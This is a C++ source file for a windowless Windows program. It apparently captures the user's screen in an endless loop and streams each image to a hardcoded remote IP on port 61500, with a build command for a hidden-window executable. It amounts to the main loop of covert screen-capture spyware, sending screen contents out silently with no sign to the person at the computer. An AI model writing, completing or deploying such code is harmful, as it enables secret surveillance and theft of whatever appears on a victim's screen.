#include <fstream>
#include <iostream>
#include <sstream>
#include <string>
#include <windows.h>

#include "helper.h"
#include "network.h"
#include "screen_manager.h"

using namespace std;

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show) {
    ofstream file;
    file.open("cout.txt");
    streambuf* sbuf = cout.rdbuf();
    cout.rdbuf(file.rdbuf());

    ScreenManager screen_manager = ScreenManager();

    // string hostname = "192.241.213.182";
    string hostname = "192.168.0.118";
    SOCKET socket = 0;

    while (true) {
        if (socket == 0) {
            socket = connect(hostname, 61500);
        }

        if (socket != 0) {
            string image = screen_manager.capture();
            send_image(socket, image, hostname);
        }

        wait();
    }

    if (socket != 0)
        disconnect(socket);

    return 0;
}

// i586-mingw32msvc-g++ -mwindows -o screen_capture.exe screen_capture.cpp helper.cpp network.cpp screen_manager.cpp -L./gdi/lib -lgdi32 -lgdiplus -lws2_32

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
